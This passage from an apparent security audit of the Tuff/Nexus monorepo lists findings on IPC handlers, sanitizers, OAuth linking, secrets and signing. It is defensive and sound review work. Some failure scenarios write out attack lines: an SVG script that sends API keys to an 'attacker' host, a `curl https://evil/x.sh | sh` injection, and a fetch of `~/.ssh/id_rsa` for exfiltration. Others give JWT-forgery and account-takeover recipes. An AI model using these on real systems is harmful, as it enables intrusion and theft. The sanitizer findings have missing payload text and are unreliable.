failure_scenario: A main-process stream handler reports failure by emitting `{ error: 'quota exceeded' }` on the data channel rather than the error channel. `onError` fires, but the controller stays in `adapter.streamControllers` and all three channel registrations (`data`/`end`/`error` for that streamId) stay attached forever. Every such failed stream permanently leaks three listeners and one controller.
recommendation: Call `cleanup()` after `options.onError?.(...)` in the data-path error branch, matching the other two error paths.

title: IFeatureCommand.value allows RegExp and function values that cannot survive manifest JSON or IPC
summary: The public `IFeatureCommand.value` union includes `RegExp` and `FeatureCommandMatcher`, but features are declared in `manifest.json` and cross IPC, where both degrade to a plain string or `{}`. Only `onTrigger` is documented as non-serializable.
failure_scenario: A plugin declares `"commands": [{ "type": "regex", "value": "^calc " }]` in manifest.json, which the type permits via the string arm. The consumer casts unsoundly (`(command.value as RegExp).test(queryText)` in plugin-features-adapter.ts:60) and throws `TypeError: command.value.test is not a function`, breaking matching for that feature. The declared `'function'` command type has no matcher branch at all and silently never matches.
recommendation: Split the manifest-facing type (string patterns only) from the runtime type, and validate/compile `regex` values into a RegExp when loading the manifest.

title: useTypedChannel returns regChannel unbound, losing its `this` receiver
summary: `send` is wrapped in a closure that preserves the receiver, but `regChannel` is copied off the channel object by reference, so calling it detached loses `this`.
evidence: regChannel: channel.regChannel,
failure_scenario: A consumer follows the documented example, does `const c = useTypedChannel<API>()` and then `c.regChannel('config-updated', fn)`. The resolved TouchChannel is a class instance whose `regChannel` reads `this.channelMap`, so the detached call throws `TypeError: Cannot read properties of undefined (reading 'channelMap')`.
recommendation: Bind it: `regChannel: channel.regChannel?.bind(channel)`.

title: levenshteinDistance allocates a full (m+1)x(n+1) matrix with no input bound
summary: The exported helper builds a complete 2D DP table rather than the standard two-row form, so memory is O(m*n) instead of O(min(m,n)), and there is no length guard on either argument.
evidence: const dp: number[][] = Array.from({ length: m + 1 }, () => Array.from({ length: n + 1 }, () => 0))
failure_scenario: A plugin developer calls `levenshteinDistance(clipboardText, documentText)` on two 20,000-character strings from `@talex-touch/utils/search`. The call allocates ~400 million array slots across 20,001 nested arrays, freezing the renderer for seconds before an out-of-memory crash.
recommendation: Use the two-row rolling DP form and reject or short-circuit inputs beyond a documented maximum length.

title: ShortcutStorage.getAllShortcuts returns the internal array, letting callers corrupt unsaved state
summary: `getAllShortcuts` hands back the live `_config` array (and `getShortcutById` a live element reference), so external mutation bypasses the `_save()` that every other mutator performs.
failure_scenario: A caller does `storage.getAllShortcuts().sort(byName)` or pushes an entry to the returned array. In-memory state changes with nothing written to disk, and the mutation is then silently persisted the next time an unrelated `updateShortcutEnabled` call triggers `_save()` - so a transient UI sort becomes the saved shortcut order.
recommendation: Return a defensive copy (`[...this._config]`, deep-cloning entries) from both accessors.

title: @talex-touch/tuff-core is configured for publishing but its entry point is empty
summary: The package declares `publishConfig.access: public`, `main: dist/index.js` and `types: dist/index.d.ts`, but `src/index.ts` contains only `export {}`, there is no `dist`, no `prepublishOnly`, and no package in the monorepo depends on it.
evidence: export {}
failure_scenario: Anyone running `npm publish` in `packages/tuff-core` ships a package whose `main` and `types` point at files that were never built, so `import ... from '@talex-touch/tuff-core'` fails to resolve for every consumer. The described 'low-level build and publish primitives for Tuff' do not exist.
recommendation: Either implement the package and add a `prepublishOnly: npm run build`, or remove it from the workspace until it has content.

title: Committed apps/nexus/.env ships a known AUTH_SECRET that signs app JWTs
summary: apps/nexus/.env is tracked in git (not gitignored) and contains AUTH_SECRET=dev-secret-change-me. Nuxt auto-loads .env from the app root, nuxt.config.ts:73 reads process.env.AUTH_SECRET, and utils/auth.ts falls back to it as the HMAC key for app tokens. assertRuntimeCredential does not reject the value.
failure_scenario: The secret is public in the repository. On any deployment that picks up the repo .env (self-host, docker build, CI/preview, a node/nitro target rather than Cloudflare bindings), getAppJwtSecret returns 'dev-secret-change-me'. An attacker mints their own token with createAppToken's exact format -- HS256 over base64url({alg,typ}).{sub:<victim userId>,iss:'tuff-nexus',aud:'tuff-app',typ:'app',exp:<future>} -- and sends it as Authorization: Bearer. verifyAppToken (auth.ts:246-288) recomputes the same HMAC, timingSafeEqual passes, and requireAppAuth returns that userId. Full account takeover for any user id, including admins. The guard does not catch it: assertRuntimeCredential only rejects values under 16 chars, values in LOCAL_ONLY_CREDENTIAL_VALUES, or values matching DOCUMENTED_PLACEHOLDER_PATTERNS, which are anchored at string start (/^change[-_ ]?me.../); 'dev-secret-change-me' is 20 chars and matches none. nuxt.config.ts:269 reuses the same authSecret as the release-download signing fallback, so signed download URLs are forgeable too.
recommendation: Delete apps/nexus/.env from git history, add it to .gitignore, rotate AUTH_SECRET, and add the value to LOCAL_ONLY_CREDENTIAL_VALUES so it can never be used outside local dev.

title: Subscription activation codes generated with Math.random(), not a CSPRNG
summary: generateActivationCode builds paid-plan activation codes from Math.random(), a non-cryptographic PRNG, even though the same file already imports randomUUID.
failure_scenario: Math.random() is V8's xorshift128+, seeded per isolate and fully reconstructable: an attacker who legitimately obtains a small number of codes issued by the same worker isolate (e.g. buys or is granted a few) can solve for the internal PRNG state and then generate the codes issued before and after theirs. The recovered code is POSTed to /api/subscription/activate, which passes it straight to activateCode (api/subscription/activate.post.ts:14), granting a paid plan the attacker never paid for. The plan prefix is not secret -- it is embedded in the code as `TUFF-${plan}-` -- so the attacker can target PLUS/TEAM/ENTERPRISE codes specifically.
recommendation: Generate the code from crypto.getRandomValues / randomUUID (already imported in this file) and reject codes after a small number of failed activation attempts.

title: Team invite codes generated with Math.random(), only 8 chars of predictable entropy
summary: generateInviteCode produces team invite codes from Math.random() over a 32-char alphabet. Invite codes are the bearer credential for joining a team.
failure_scenario: An attacker creates their own team to harvest invite codes generated by the same worker isolate, recovers the Math.random() xorshift128+ state from those outputs, and predicts invite codes minted for other organizations. The predicted code is submitted to /api/team/join (api/team/join.post.ts) or read via /api/team/invite/[code], joining the attacker to a team they were never invited to and giving them access to that team's shared quota, member list and team-scoped resources. Unlike the activation code there is no plan prefix to guess and the code is only 8 characters, so even blind guessing is far cheaper than a 128-bit token.
recommendation: Use crypto.getRandomValues for invite codes, lengthen them, and rate-limit /api/team/join per account and per IP.

title: tpex manifest _signature is an unkeyed MD5 of the file map, providing no authenticity
summary: verifyManifestIntegrity treats manifest._signature as a trust signal, but generateSignature is an unkeyed MD5 over the _files map that anyone repacking the archive can recompute.
failure_scenario: An attacker who can supply a .tpex package modifies plugin files, recomputes each file's sha256 into manifest._files, then recomputes the MD5 over that map and writes it to manifest._signature. verifyManifestIntegrity passes because the check only proves _signature is self-consistent with _files -- no secret and no publisher key is involved -- so the field carries no authenticity despite its name. The per-file sha256 comparison is likewise self-referential against the attacker-supplied manifest. Real publisher authenticity depends entirely on the separate publisher_signature path (utils/pluginSigning.ts); any code path or reviewer that treats a passing _signature as evidence of provenance is relying on a control that does not exist. MD5 is additionally collision-broken and should not appear in a field named _signature.
recommendation: Rename the field to make its checksum-only role explicit, switch the digest to SHA-256, and ensure admission decisions depend only on the keyed publisher signature.

title: Plugin signing canonical JSON sorts keys with localeCompare, so it is not deterministic
summary: canonicalize() orders object keys with localeCompare(left, right, 'en') instead of a codepoint sort. This canonical form is the exact byte string that gets signed and verified across three different JS runtimes.
failure_scenario: serializePluginSigningValue feeds three runtimes with different ICU collation data: the publisher CLI signs via packages/tuff-cli-core/src/plugin-signer.ts:150, Nexus verifies on Cloudflare Workers via apps/nexus/server/utils/pluginSigning.ts:438, and the Electron main process verifies via apps/core-app/src/main/modules/plugin/signature-verifier.ts:242. localeCompare is ICU/locale-data dependent (Node small-icu vs full-icu vs the Workers runtime), so the same object can serialize to different byte strings on signer and verifier, producing spurious signature failures. Worse, ICU collation returns 0 for distinct strings that differ only by collation-ignorable code points (e.g. a soft hyphen U+00AD or ZWJ U+200D inside a path); when the comparator returns 0, Array.prototype.sort leaves those keys in input order, which for serializePluginFileMap comes from attacker-chosen tar entry ordering. A publisher can therefore craft plugin file names whose canonical serialization -- and thus the signed fileMapSha256 -- is not a function of the file map alone.
recommendation: Sort with a plain codepoint comparator (left < right ? -1 : left > right ? 1 : 0) and reject duplicate keys, so canonicalization is byte-deterministic on every runtime.

title: OAuth sign-in links to an existing account by email alone, without checking email_verified
summary: The next-auth signIn callback merges an incoming OAuth identity into an existing local account whenever the provider-supplied email matches, with no verification that the provider actually validated that address.
failure_scenario: An attacker sets the email address on their account at a federated provider (the custom 'linuxdo' provider at LINUXDO_ISSUER=https://connect.linux.do, whose profile mapper reads profile.email with no email_verified check) to the address of a Tuff user they want to take over. They then click 'Sign in with LinuxDo'. getUserByAccount finds no prior link, so control falls through to the email branch: getUserByEmail returns the victim's account and signIn returns true, so the attacker receives a session bound to the victim's user id. No password, no email confirmation, and no prior link between the two identities is required. utils/auth.ts:54-71 (resolveSessionUserByEmail) compounds this by auto-provisioning any unmatched session email with emailState: 'verified' and emailVerified set to the current time.
recommendation: Only auto-link when the provider asserts a verified address (check profile.email_verified per provider) and the local account's email is already verified; otherwise require an explicit, authenticated link step.

title: Any publisher can store an SVG plugin icon that is served as image/svg+xml on the app origin
summary: Plugin icon upload is reachable with the non-admin plugin:publish scope and inherits the default allow-list that includes svg. The public image endpoint then echoes the stored content type with no X-Content-Type-Options and no Content-Disposition.
failure_scenario: plugin:publish is not an admin-only scope -- ADMIN_ONLY_SCOPE_PREFIXES in utils/apiKeyScopes.ts:21 is ['plugin:moderate', 'release:', 'maintenance:'] and plugin:publish is in DEFAULT_PLUGIN_API_KEY_SCOPES -- so any registered user can create an API key with it. That user POSTs a plugin to /api/dashboard/plugins with an 'icon' form file containing an SVG whose body is <svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/api/dashboard/api-keys').then(r=>r.text()).then(t=>fetch('//attacker/'+btoa(t)))</script></svg>. uploadImage accepts it (image/* and the svg extension are both allowed) and returns a key. Any visitor who loads /api/images/<key> as a top-level document gets Content-Type: image/svg+xml with no nosniff and no attachment disposition, so the browser renders the SVG as an active document on the Nexus origin and the script runs same-origin against the victim's dashboard session. X-Content-Type-Options: nosniff appears nowhere in the repository, and sibling download routes such as api/plugins/assets/[key].get.ts:65 do set Content-Disposition: attachment, so this endpoint is the outlier.
recommendation: Drop svg from the upload allow-list (or sanitize/rasterize it), and on every user-content response set X-Content-Type-Options: nosniff plus Content-Disposition: attachment, or serve user content from a separate origin.

title: Password sign-in has no lockout, throttle or captcha; failures are logged but never counted
summary: The credentials provider records each failed password attempt via logLoginAttempt but never reads that history back, and no rate limiter or Turnstile check guards the sign-in path.
failure_scenario: An attacker POSTs to the credentials callback in a loop with a fixed victim email and a password list. Each miss calls logLoginAttempt and returns null, but nothing ever queries the login-attempt table to count recent failures, so the attempt budget is unbounded and the account is never locked or delayed. The project already has the pieces it needs and simply does not apply them here: enforceAdminRateLimit (utils/adminRateLimitStore.ts) guards api/admin/emergency/*, evaluateDeviceAuthRateLimit guards api/app-auth/device/approve.post.ts, and verifyTurnstileToken (utils/turnstile.ts) is wired into api/auth/register.post.ts:24 -- but sign-in has none of the three. PBKDF2 at 210k iterations raises per-guess cost but does not bound the number of guesses.
recommendation: Count recent failures per account and per IP from the existing login-attempt table and apply progressive delay plus lockout, and require Turnstile on sign-in after the first failure.

title: Scene asset download performs no ownership check on the asset key
summary: The handler calls requireAuthOrApiKey(event) with no scopes and then serves the asset for any well-formed key, never checking that the referenced scene run belongs to the calling user -- unlike its siblings plugins/assets/[key].get.ts and v1/sync/blobs/[blob_id]/download.get.ts, which do scope by owner.
failure_scenario: Any registered user (or the holder of any API key, including a self-issued plugin:publish key from /api/dashboard/api-keys, since requiredScopes is empty so requireApiKey enforces neither scope nor role) can GET /api/v1/scenes/assets/scene_run_<uuid>.<ext> for another user's run and receive its full body. The only barrier is the secrecy of the run UUID, which leaks through referrers, shared links and proxy/CDN logs -- there is no server-side authorization at all.
recommendation: Look up the scene run that owns the key and reject when its owner id does not match the authenticated user (allowing admins explicitly), mirroring v1/sync/blobs/[blob_id]/download.get.ts.

title: Webhook notification URL is used unvalidated while the sibling relay path enforces https
summary: Webhook credentials store an arbitrary url string with only a length check, and the dispatcher passes it straight to the HTTP client, unlike readHttpsRelayEndpoint in the same file which rejects non-https destinations.
failure_scenario: storeNotificationCredential accepts any non-empty string under 2048 chars as the webhook url -- no URL parse, no scheme check, no host allow-list. An admin (or anyone who reaches api/dashboard/notifications/credentials.post.ts through a compromised admin session or CSRF) sets url to http://169.254.169.254/latest/meta-data/ or an internal address, and every dispatched notification makes the server issue that request; validateStatus accepts every status 100-599, so the delivery record reflects the response code and acts as a probe oracle. Because plain http is permitted, the notification body and the X-Tuff-Signature HMAC also travel in cleartext to whatever host is configured.
recommendation: Parse and validate the webhook URL at write time with the same rule readHttpsRelayEndpoint already applies (https only, or http for loopback in dev), and reject private/link-local hosts.

title: Regex markdown sanitizer is bypassable; plugin README reaches v-html in the Electron renderer
summary: sanitizeMarkdownHtml strips dangerous elements and then attributes in separate sequential .replace() passes. Removing an attribute in a later pass can splice a tag or event handler back together, and the result is injected with v-html.
failure_scenario: The passes run in sequence over each other's output, so text that is not a handler when the on-pass runs can become one after the style-pass deletes the attribute between the halves. Executing the exact regex chain from this file confirms it: input produces output . The src survives because isAllowedUrl accepts any value starting with '/', it 404s, and onerror fires. The same splice yields
recommendation: Replace the regex chain with a real parser-based sanitizer (DOMPurify on the client, or a parse-and-serialize allow-list), since sequential regex passes cannot be made safe.

title: Telemetry ingestion trusts a client-supplied userId with no authentication
summary: The telemetry endpoints are unauthenticated (IP guard only) yet accept userId straight from the request body and persist it as the event's owner.
failure_scenario: There is no requireAuth on this route and nothing binds the body's userId to a session or token, so anyone on the internet can POST {eventType:'search', userId:'<victim id>', searchQuery:'...'} and have it stored as that user's activity. The same pattern repeats in api/telemetry/batch.post.ts:43 at up to 100 events per request. An attacker can fabricate another user's search history and device fingerprints, which then surface in the per-user view at api/dashboard/telemetry/me.get.ts and in admin analytics, corrupting abuse investigations and any usage-derived decision. It also lets an attacker plant chosen strings into records attributed to a specific person.
recommendation: Derive userId from the authenticated session or app token and ignore any userId in the body; keep anonymous events tied to clientId only.

title: Renderer-supplied metadata.trusted suppresses the main-process plugin install confirmation
summary: The install queue treats a boolean sent by the renderer as proof that the user already approved the install, so the main-process consent prompt is skipped on the client's say-so.
failure_scenario: Any code running in the renderer emits PluginEvents.install.source with {source:'<attacker url or path>', metadata:{trusted:true}}. trustedHint becomes true, needsConfirmation evaluates false, and the plugin installs with no user-visible prompt. Signature verification does not compensate: at install-queue.ts:194-205 requiresRegistryTrust is only set when providerResult.official is true or sourceType === 'registry', so for a non-registry source with no trust metadata the verifyPluginPackageTrust call is skipped entirely. The neighbouring officialActual field shows the intended pattern -- it is recomputed in the main process at line 187 from prepared.providerResult.official rather than taken from the client -- and trustedHint is the one that was left client-authoritative. This chains directly with the plugin-README sanitizer bypass in packages/utils/renderer/shared/markdown-sanitizer.ts, whose payload executes in this very renderer on the store detail overlay: viewing a malicious plugin listing becomes a silent install of arbitrary plugin code.
recommendation: Delete trustedHint from the skip condition and require the main process to have shown and received its own confirmation; treat all renderer-supplied metadata as untrusted hints only.

title: Search text is passed as the first argv to Everything es.exe, allowing option injection
summary: The raw query string is placed in argv[0] of the Everything CLI with no leading -- separator, so a query beginning with a dash is parsed as a CLI switch rather than as search text.
evidence:
const { stdout } = await this.exec(
      esPath,
      [
        query,
        '-n',
        String(maxResults),
        '-sort',
        'path',
        '-full-path-and-name',
        '-size',
        '-dm',
        '-dc',
        '-csv',
        '-no-header'
      ],
      { timeout: 5000, maxBuffer: 10 * 1024 * 1024, signal, windowsHide: true }
    )
failure_scenario: query reaches this call unmodified from the CoreBox search field via everything-provider.ts:1591. es.exe interprets any argument starting with '-' as an option, so a query such as '-export-csv C:\\Users\\Public\\out.csv' is consumed as the export switch and writes an attacker-chosen file containing index contents instead of performing a search; other switches (-r for regex, -path) similarly change behaviour. This is argument injection rather than shell injection -- this.exec resolves to promisified execFile with an args array, so no shell metacharacters are interpreted -- but the option surface is still reachable. Impact is bounded because the query normally originates from the local user typing in their own launcher; it matters when a query is supplied programmatically, for example by a plugin or a recommendation flow that forwards text it did not author.
recommendation: Insert a '--' end-of-options separator before query, or reject/escape leading dashes before building the argv array.

title: One matching recovery code releases every device keyring, with no attempt limit
summary: recoverKeyrings verifies the submitted recovery code against each device's stored hash, but on the first match it returns every row for the user rather than the matching device's keyring, and nothing counts failed attempts.
failure_scenario: The success path maps over rows, not candidates, so proving knowledge of a single device's recovery code hands back the encrypted keyrings of every device the user owns, including devices whose recovery_code_hash is different or null. One recovery code written down, screenshotted or leaked from a single old device therefore compromises the whole fleet's key material rather than that one device. Separately, nothing bounds guessing: api/v1/keys/recover-device.post.ts calls recoverKeyrings on every request with no counter, no lockout and no enforceAdminRateLimit-style guard, so a caller holding an app token for the account can submit recovery codes indefinitely. The step-up in that route does not compensate either -- requireStepUpIfPasskeyEnabled (recover-device.post.ts:12-19) returns early and demands nothing when the device is already trusted or when the user has registered no passkeys.
recommendation: Return only the keyring whose recovery code matched, and rate-limit plus lock out repeated recovery attempts per user and device.

title: Download task handler writes to any caller-supplied destination and filename
summary: addTask takes `destination` and `filename` verbatim from the IPC payload with no normalization, allowlist or traversal check; the worker then mkdir -p's the directory and opens a write stream there. registerSafeHandler is only an error-swallowing wrapper, not a permission gate.
evidence:
const destination = request.destination || this.config.storage.defaultDestination
...
      filename: request.filename || path.basename(request.url),
evidence_extra: download-worker.ts:371-409 `const outputPath = path.join(task.destination, task.filename)` / `await fs.mkdir(path.dirname(outputPath), { recursive: true })` / `const writeStream = createWriteStream(outputPath, { flags: 'w' })`
failure_scenario: A plugin (via window.$channel.send, since transport.on also registers on the plugin channel) or any injected renderer script sends DownloadEvents.task.add with `{url: 'https://attacker/payload', destination: '/Users/<victim>/Library/LaunchAgents', filename: 'com.evil.plist'}`. The worker creates the directory if needed and writes the attacker's HTTP response there, giving arbitrary file write anywhere the app process can reach -- login-item persistence on macOS, the Startup folder on Windows, or overwriting the app's own config/plugin files. `filename` is equally unchecked, so `../../..` traversal works even against a fixed destination.
recommendation: Resolve destination+filename with resolveSafePath against an allowlist of download roots, reject traversal and absolute filenames, and gate the event on the already-declared network.download permission.

title: NetworkEvents.api.request is an unauthenticated SSRF proxy for plugins
summary: The network module forwards the whole request object to the HTTP service with no URL validation and no permission check, even though the permission registry declares network.local, network.internet and network.download for exactly this capability.
failure_scenario: installPluginViewNavigationPolicy (plugin-window-policy.ts:555) carefully confines a plugin view's own network to its plugin root via session.webRequest.onBeforeRequest. A plugin simply bypasses that by calling `window.$channel.send('<network api request event>', {method:'GET', url:'http://127.0.0.1:8080/admin'})`: the request is issued by the main process, outside the view's session, with the user's LAN position and no origin restrictions. That reaches localhost-only admin panels, 169.254.169.254 metadata endpoints and internal hosts, and the response body is returned to the plugin. No withPermission wrapper exists on any of these three handlers, so the declared network.* permissions are never consulted.
recommendation: Wrap the request/readText/readBinary handlers in withPermission for network.internet / network.local and block requests to loopback, link-local and private ranges unless network.local was granted.

title: Markdown sanitizer href/src protocol check bypassed by `/` attribute separator
summary: sanitizeMarkdownHtml strips on*/style attributes with `[\s/]+` (explicitly handling the `/` separator) but the href/src protocol allowlist uses `\s+`, so `<a/href="javascript:...">` is never inspected and survives sanitization verbatim.
failure_scenario: Verified by executing the exact regex chain from this file: `x` is correctly reduced to `x`, but `x` is returned unchanged, and browsers parse `/` as a valid attribute-name separator. renderMarkdownToSafeHtml feeds GitHub release-notes bodies into UpdatePromptDialog.vue:200 `v-html="renderedMarkdown"` and plugin-store READMEs into SharedPluginDetailReadme.vue:22. An attacker controlling a release body or a published plugin README ships that anchor; the user clicks it in the privileged renderer, and since the CSP allows 'unsafe-inline' the javascript: URL executes with full ipcRenderer access -- from which the openApp/executeCommand/download handlers below give local code execution.
recommendation: Change both href/src regexes to `[\s/]+` to match the on-handler pattern, and replace the regex sanitizer with DOMPurify.

title: system.openApp transport handler passes unvalidated path to shell.openPath
summary: The AppEvents.system.openApp handler takes appName or path straight from the IPC payload and hands it to shell.openPath with no allowlist, extension check or path validation, and no permission wrapper.
failure_scenario: Any plugin (transport.on also registers on the plugin channel) or injected renderer script sends system.openApp with `{path: '/Users/<victim>/Library/Caches/payload.command'}` -- a file it can drop first via the unvalidated download handler. shell.openPath asks the OS to open it, which on macOS/Windows executes it outside the Electron sandbox. Nothing here consults the permission module, and even withPermission would not help a renderer caller because channel-guard.ts:126 returns early when there is no plugin id.
recommendation: Validate the target against a resolved allowlist of installed application bundles, reject non-application extensions, and require explicit user confirmation for anything outside it.

title: system.executeCommand handler opens any caller-supplied path with no validation
summary: AppEvents.system.executeCommand accepts an arbitrary command string and passes it to shell.openPath. Its registerSafeHandler wrapper is createSafeOperationHandler (common.ts:1225), which only reports errors -- it performs no permission or identity check.
failure_scenario: A plugin calls window.$channel.send with the system.executeCommand event name and `{command: '<path to a .command/.bat/.app it wrote via the download handler>'}`. shell.openPath hands the path to the OS shell association and it runs. The handler restricts the path to nothing -- not a config directory, not an app bundle, not a known extension -- despite the event name implying a vetted command surface.
recommendation: Either delete the event or restrict it to a fixed enum of internal actions; never pass a caller-supplied string to shell.openPath.

title: will-navigate hands any URL, including file:, to shell.openExternal without confirmation
summary: TouchWindow's will-navigate listener forwards every blocked navigation URL to this handler, which explicitly allows the file protocol and then calls shell.openExternal. The 'confirm' decision is never actually confirmed -- it logs and opens anyway.
failure_scenario: apps/core-app/src/main/core/touch-window.ts:93 emits OPEN_EXTERNAL_URL for every will-navigate URL before preventing the navigation. A link or script in the renderer navigating to `file:///Users/<victim>/Library/Caches/payload.command` triggers will-navigate; getOpenUrlDecision returns 'open' for the file protocol and shell.openExternal executes it through the OS handler. Every other protocol falls into the 'confirm' branch at line 1083, which despite its name shows no dialog and reaches shell.openExternal at line 1095, so arbitrary custom-scheme handlers registered on the machine can also be invoked.
recommendation: Route this through validateExternalUrl (already restricts to http/https/mailto/tel/tuff), drop the file special case, and implement a real confirmation dialog for the 'confirm' branch.

title: Terminal write/kill IPC handlers have no permission guard and no session ownership check
summary: Only TerminalEvents.session.create is wrapped in withPermission('system.shell'); write and kill are registered bare, and neither checks that the caller owns the session id it names.
failure_scenario: A plugin denied (or never granted) system.shell cannot call session.create, but it can call session.write with any id. `this.processes` is a single global map keyed only by id, and write() does `this.processes.get(id).stdin.write(data)` (line 148) with no comparison against the requesting webContents or plugin identity. The plugin races or brute-forces an id (format `proc_${Date.now()}_${9 base36 chars}`) for a session the host or another plugin started and writes `curl https://evil/x.sh | sh\n` into that process's stdin -- obtaining exactly the capability the permission gate exists to withhold. kill() lets the same caller terminate anyone's session.
recommendation: Record the owning webContents/plugin identity alongside each spawned process and reject write/kill from any other caller; also wrap both handlers in withPermission('system.shell').

title: Renderer override installed even when release signature verification fails
summary: installRendererOverride computes the RSA signature verification result, logs a warning when it is invalid, then unconditionally falls through to extract and install the bundle. The checksum is likewise only verified when the artifact happens to declare one.
failure_scenario: An attacker who can influence the release feed (compromised release asset, hijacked signature URL, or an artifact published with neither sha256 nor signatureUrl) serves a renderer bundle. The sibling installer path resolveVerifiedInstallTask (lines 738-762) throws on a missing checksum, a missing signature URL or an invalid signature; this path only warns, so the zip is extracted into the renderer-override root and renderer-override.json is written with `enabled: true`. When the override is active the bundle runs as the app's renderer, which per channel-guard.ts:126 holds unguarded system.shell plus the shell.openPath and download handlers above.
recommendation: Make this path fail closed exactly like resolveVerifiedInstallTask: require both a checksum and a valid signature, and throw instead of warning.

title: Renderer CSP allows unsafe-inline, unsafe-eval and any remote origin
summary: The only CSP on the privileged renderer is `default-src *` with `script-src * 'unsafe-inline' 'unsafe-eval'` and `connect-src *`, so it provides no containment for injected script and no exfiltration limit.
evidence:
<meta
      http-equiv="Content-Security-Policy"
      content="
    default-src * blob: data: tfile: remix:;
    script-src * 'unsafe-inline' 'unsafe-eval' blob: data:;
    connect-src * ws: wss: blob: data: tfile:;
failure_scenario: This renderer is where src/preload/index.ts:139 publishes an unrestricted ipcRenderer via `contextBridge.exposeInMainWorld('electron', electronAPI)`, and where channel-guard.ts:126 grants every non-plugin caller all permissions. Any injected markup -- for example the `<a/href="javascript:...">` that survives the markdown sanitizer when rendering GitHub release notes -- executes because 'unsafe-inline' permits javascript: URLs and inline handlers. It then reaches system.openApp / system.executeCommand / DownloadEvents.task.add / terminal.session.create for local code execution, and `connect-src *` lets it POST the results to any host.
recommendation: Drop 'unsafe-inline' and 'unsafe-eval', restrict default-src/script-src to 'self' plus the app's own schemes, and enumerate connect-src to the Nexus origin.

title: tfile:// protocol allowlist covers the entire user home directory
summary: getAllowedLocalFileRoots returns app.getPath('home') as an allowed root, so the tfile: custom protocol registered on the default session will serve any file under the user's home directory, not just icons and app assets.
evidence:
const candidates = [
    options.includeCwd ? process.cwd() : null,
    appPathSafe('home'),
    appPathSafe('userData'),
    appPathSafe('temp'),
failure_scenario: The renderer CSP explicitly whitelists `tfile:` in default-src, connect-src and img-src. Injected renderer script (see the markdown sanitizer bypass) runs `await (await fetch('tfile:///Users/<victim>/.ssh/id_rsa')).text()`; isAllowedLocalFilePath passes because the path sits under the home root, and `connect-src *` lets the result be exfiltrated. The same works for ~/.aws/credentials, browser cookie databases and the app's own secure-store files.
recommendation: Narrow the roots to the directories the protocol actually needs (userData, temp, /Applications icon paths) and drop the blanket home-directory root.

title: Permission guard allows any API name that is missing from the mapping table
summary: PermissionGuard.check() returns allowed:true whenever an API name matches no entry in API_PERMISSION_MAPPINGS, so the permission model is an opt-in denylist keyed on a hand-maintained string table rather than a default-deny gate.
failure_scenario: API_PERMISSION_MAPPINGS (lines 52-126) enumerates colon-separated names such as 'network:request' and 'system:exec'. Any capability whose call site passes a name not in that list -- including every capability added since the table was last updated -- is granted unconditionally to any plugin. Combined with the fact that only six main-process files call withPermission/enforcePermission at all, a plugin's manifest permission declarations bound almost nothing: the network, download, terminal-write and shell handlers reported above never reach this function in the first place, and anything that does reach it with an unmapped name is waved through.
recommendation: Default-deny: return allowed:false for unmapped API names and require every guarded call site to name a permission explicitly, with a test that fails when a transport event has no mapping.

title: LinuxDO OAuth links unverified third-party email to existing accounts (takeover)
summary: The LinuxDO OAuth provider sets allowDangerousEmailAccountLinking: true while its profile() mapper takes profile.email straight from the third-party /api/user response with no email_verified or ownership check, so an attacker-controlled LinuxDO account claiming a victim's email is auto-linked into the victim's existing Nexus account.
evidence:
allowDangerousEmailAccountLinking: true,   // line 619
...
          email: profile.email ?? null,           // line 661
...
          const email = user?.email ?? (profile as any)?.email   // line 698
          if (!email) return true
          const existing = await getUserByEmail(authEvent, email)
          if (!existing) return true
          return Boolean(await restoreForInteractiveSignIn(authEvent, existing.id))  // line 702
failure_scenario: Attacker sets or claims victim@example.com on an account at the LinuxDO issuer, then clicks Sign in with LinuxDO on Nexus. userinfo returns {email:'victim@example.com'} unverified -> profile() passes it through -> the signIn callback finds the existing Nexus user and returns true -> next-auth links the OAuth account to that user id and issues a session. The attacker now controls the victim's Nexus account, including an admin-role account, without ever proving control of the mailbox.
recommendation: Set allowDangerousEmailAccountLinking: false for linuxdo, or require an explicit email_verified === true claim plus an in-app confirmation step before linking an OAuth identity to a pre-existing local user.

title: GitHub email selection falls back to an unverified address before account linking
summary: The GitHub userinfo handler's third fallback picks any address from /user/emails with no verified === true requirement, and that address is then used for allowDangerousEmailAccountLinking at line 529.
failure_scenario: Attacker adds victim@example.com to their GitHub account without confirming it and keeps the public profile email null. If no verified address is returned by /user/emails, the first two find() branches miss and the third selects the unverified victim address. profile.email becomes the victim's address, the signIn callback at line 700 matches the existing Nexus user, and allowDangerousEmailAccountLinking: true links the attacker's GitHub identity to the victim's account.
recommendation: Delete the third fallback so only verified === true addresses are accepted; if no verified address exists, fail the sign-in.

title: Subscription activation codes generated with Math.random (predictable)
summary: Paid-plan activation codes are built from Math.random() instead of a CSPRNG, so the full code space is derivable from the V8 xorshift128+ state once a few codes are observed.
failure_scenario: An attacker obtains a handful of codes minted in the same batch (buys two, or reads codes from a public promo), recovers the V8 PRNG state from the consecutive Math.random() outputs, and reconstructs every other code produced by that isolate. They then POST each predicted code to /api/subscription/activate (no rate limiting, only a verified email required) and activateCode grants PRO/PLUS/TEAM/ENTERPRISE subscriptions for free.
recommendation: Generate codes with crypto.getRandomValues/randomBytes and add per-user rate limiting plus lockout on /api/subscription/activate.

title: Release download signature verification is a no-op under default config
summary: An invalid or expired sig/exp pair is accepted whenever allowUnsignedFallback is true, and that flag defaults to true (RELEASE_DOWNLOAD_ALLOW_UNSIGNED_FALLBACK !== 'false' in nuxt.config.ts:271), so the signed-URL control never rejects anything unless an operator opts in.
failure_scenario: Anyone requests /api/releases/<tag>/download/<platform>/<arch>?exp=1&sig=<64 arbitrary hex chars>. verifyReleaseDownloadSignature returns {valid:false, reason:'expired'}, but because allowUnsignedFallback defaults to true the branch is skipped and the asset is served. The TTL produced by createSignedReleaseDownloadPath is therefore never enforced and expired links keep working indefinitely.
recommendation: Fail closed: when a signature is supplied it must verify regardless of the fallback flag, and default allowUnsignedFallback to false.

title: Hardcoded fallback signing secret for doc analytics tokens
summary: getDocTokenSecret() falls back to the literal 'nexus-doc-analytics-fallback-secret-v1' when no candidate is >=16 chars, and unlike every other secret in the codebase it never goes through assertRuntimeCredential/readCloudflareBindings, so a Cloudflare Pages deploy that supplies secrets purely as bindings silently signs with the constant.
evidence:
tokenSecretCache = 'nexus-doc-analytics-fallback-secret-v1'
  return tokenSecretCache
